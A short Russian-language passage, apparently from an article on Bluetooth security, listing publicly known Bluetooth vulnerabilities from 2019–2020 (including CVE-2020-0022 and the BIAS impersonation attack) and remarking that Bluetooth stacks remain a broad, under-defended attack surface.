- Август 2019 - CVE-2019-9506 уязвимость согласования ключей шифрования Bluetooth
- Сентябрь 2019 - CVE-2019-9426 возможность выхода за границы при некоторых проверках в Bluetooth стеке Android
- Февраль 2020 - CVE-2020-0022 подвержены устройства c версией Android меньше 10
- Май 2020 - BIAS (Bluetooth Impersonation
Attack) атака может обходить процесс Bluetooth аутентификации

Также остается множество подобных ошибок в Bluetooth стеках операционных систем, о которых разработчикам еще ничего неизвестно. Существует внушительный вектор для атаки на Bluetooth устройства, так как существующие методы защиты спроектированы против угроз, распространяющихся через интернет соединение.